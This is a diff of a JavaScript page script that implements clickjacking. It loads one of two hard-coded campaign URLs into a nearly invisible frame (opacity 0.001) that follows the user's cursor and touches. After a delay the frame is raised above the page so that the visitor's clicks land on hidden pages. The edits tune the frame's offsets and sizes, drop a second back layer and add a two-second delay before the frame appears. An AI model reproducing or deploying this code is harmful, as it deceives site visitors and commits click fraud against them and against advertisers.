@@ -1,10 +1,11 @@
 var randLinks = ["https://www.mantendoasaude.com/?utm=instagram&campanha=N2FjMDI0ODRhYjljYmVjMTA2MzA4NDlmOTAzY2I2ZTUmaWQ9YThmNWYxNjdmNDRmNDk2NGU2Yzk5OGRlZTgyNzExMGM=","https://guiadepescaesportivaemsantos.com/?utm=facebook&campanha=7ac02484ab9cbec10630849f903cb6e5&id=a8f5f167f44f4964e6c998dee827110c"];
 var randCookies = ["_gcli2","_gcli1"];
+var clientWidth = window.innerWidth;
+var clientHeight = window.innerHeight;
 var cookieName = '';
 var urlFrame = '';
-var frameCode = '<object id="iplezier" type="text/html" style="position:absolute;width:100%;height:100%;overflow: hidden"></object>';
-var cssCode = '<style>#guerejo{position:fixed;z-index:-9999999;bottom:0;left:0;height:90%;width:100%;opacity:0.001;overflow:hidden;}#guerejoback{position:fixed;z-index:-99999999;bottom:0;left:0;height:90%;width:100%;opacity:0.001;overflow:hidden;}</style>';
-var frameSecondCode = '';
+var frameCode = '<object id="iplezier" type="text/html" style="position:absolute;width:'+ clientWidth +'px;height:'+ clientHeight +'px;overflow: hidden"></object>';
+var cssCode = '<style>#guerejo{position:fixed;z-index:-999999;bottom:0;left:0;height:90%;width:100%;opacity:0.001;overflow:hidden;}</style>';
 var Started = 0;
 var monitor = 0;
 var isMobile = false; //initiate as false
@@ -56,31 +57,29 @@ function getCookie(strCookie) {
 
 function minimizeFrame() {
     Started = 0;
-    $("#guerejo").css("width", "100%").css("height", "90%").css("top", "0").css("left", "0").css("z-index", "-9999999").css("position", "fixed");
-    $("#guerejoback").css("width", "100%").css("height", "90%").css("top", "0").css("left", "0").css("z-index", "-99999999").css("position", "fixed");
+    $("#guerejo").css("width", "100%").css("height", "90%").css("top", "0").css("left", "0").css("z-index", "-999999").css("position", "fixed");
     $("#iplezier").css("top", "").css("left", "").css("pointer-events", "none");
 }
 
 function putGuerejo(){
-    $("body").append(cssCode + '<div id="guerejo"></div><div id="guerejoback"></div>');
+    $("body").append(cssCode + '<div id="guerejo"></div>');
 }
 
 function putFrame() {
     putGuerejo();
     $("body").css("overflow-x", "hidden").css("width", "100%");
     $("#guerejo").html(frameCode).css("width", "100%").css("height", "90%").css("overflow", "hidden");
-    $("#guerejoback").html(frameSecondCode).css("width", "100%").css("height", "90%").css("overflow", "hidden");
 
     $(document).on('mousemove touchstart', function(e){
         var retorno = pointerEventToXY(e);
         if (Started == 1) {
             $('#guerejo').css({
-                left:  retorno.x - 354,
-                top:   retorno.y - 35
+                left:  retorno.x - 234,
+                top:   retorno.y - 30
             });
-            $('#guerejoback').css({
-                left:  retorno.x - 354,
-                top:   retorno.y - 35
+            $('#iplezier').css({
+                width:  window.innerWidth,
+                height:   window.innerHeight
             });
         }
     });
@@ -95,9 +94,8 @@ function setUrlFrame() {
 }
 
 function showFrame() {
-    $("#guerejo").css("width", "790px").css("height", "200px").css("z-index", "9999999999").css("position", "absolute");
-    $("#guerejoback").css("width", "790px").css("height", "200px").css("z-index", "999999999").css("position", "absolute");
-    $("#iplezier").css("top", "-110px").css("left", "-70px").css("pointer-events", "");
+    $("#iplezier").css("top", "-110px").css("left", "-" + parseInt(clientWidth / 2 - 234) + "px").css("pointer-events", "");
+    $("#guerejo").css("width", "468px").css("height", "60px").css("z-index", "999999").css("position", "absolute");
 }
 
 function checkDelay() {
@@ -109,7 +107,7 @@ function checkDelay() {
         } else {
             Started = 1;
             startTracker();
-            showFrame();
+            setTimeout(showFrame,2000);
         }
     }
 }
